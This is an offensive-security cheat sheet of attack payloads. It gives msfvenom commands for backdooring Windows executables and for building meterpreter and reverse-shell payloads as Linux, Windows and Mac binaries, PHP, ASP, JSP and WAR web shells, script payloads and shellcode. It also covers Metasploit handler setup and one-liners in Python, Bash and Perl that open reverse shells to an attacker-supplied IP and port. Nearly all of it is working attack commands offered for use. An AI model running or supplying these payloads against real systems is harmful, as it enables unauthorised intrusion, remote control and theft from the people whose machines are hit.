# PAYLOADS
- http://lolbas-project.github.io
- http://loldrivers.io
- http://gtfobins.github.io
- http://lots-project.com
- http://filesec.io
- http://malapi.io
- http://hijacklibs.net
- http://wadcoms.github.io
- http://persistence-info.github.io
- http://unprotect.it


# Backdooring EXE Files

	msfvenom -a x86 -x <[FILE]> -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.88 lport=443 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o <[FILE_NAME]>

# Binaries payloads

<b>Linux:</b>
	
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f elf > <[FILE_NAME.elf]>

<b>Windows:</b>

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f exe > <[FILE_NAME.exe]>

<b>Mac</b>
	
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f macho > <[FILE_NAME.macho]>

# Web payloads

<b>PHP:</b>

	msfvenom -p php/meterpreter_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.php]>
	cat <[FILE_NAME.php]> | pbcopy && echo '<?php ' | tr -d '\n' > <[FILE_NAME.php]> && pbpaste >> <[FILE_NAME.php]>

<b>ASP:</b>
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f asp > <[FILE_NAME.asp]>

<b>JSP:</b>
	
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.jsp]>

<b>WAR:</b>

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f war > <[FILE_NAME.war]>
	
# Scripting Payloads

<b>Python:</b>

	msfvenom -p cmd/unix/reverse_python LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.py]>

<b>Bash:</b>

	msfvenom -p cmd/unix/reverse_bash LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.sh]>

<b>Perl</b>

	msfvenom -p cmd/unix/reverse_perl LHOST=<[IP]> LPORT=<[PORT]> -f raw > <[FILE_NAME.pl]>

# Shellcode
For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

<b>Linux Based Shellcode:</b>

	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>

<b>Windows Based Shellcode:</b>

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>

<b>Mac Based Shellcode:</b>
	
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>

# Staged vs Non-Staged Payloads

<b>Staged payload:</b> (useful for bof) (need multi_handler metasploit in order to works)

	Windows/shell/reverse_tcp
	
	msfvenom -a x86 -p linux/x86/shell/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -b "\x00" -f elf -o <[FILE_NAME_STAGED]>

<b>Non-staged:</b> (ok with netcat listener)

	Windows/shell_reverse_tcp
	
	msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -b "\x00" -f elf -o <[FILE_NAME_NON_STAGED]>

# Handlers

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

	use exploit/multi/handler
	
	set PAYLOAD <[PAYLOAD_NAME]>
	
	set LHOST <[IP]>
	
	set LPORT <[PORT]>
	
	set ExitOnSession false
	
	exploit -j -z

# Shell Spawning

<b>Python:</b>

	python -c 'import pty; pty.spawn("/bin/sh")'
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
	
<b>Bash:</b>
	
	echo os.system('/bin/bash')
	
	/bin/sh -i
	
	exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done
	
<b>Perl:</b>
	
	perl —e 'exec "/bin/sh";'
	
	perl: exec "/bin/sh";
	
	perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	
<b>Ruby:</b>
	
	ruby: exec "/bin/sh"
	
<b>Lua:</b>
	
	lua: os.execute('/bin/sh')

<b>From within IRB:</b>
	
	exec "/bin/sh"
	
<B>From within vi:</B>
	
	:!bash
	
<B>From within vi:</B>

	:set shell=/bin/bash:shell
	
<B>From within nmap:</B>
	
	!sh
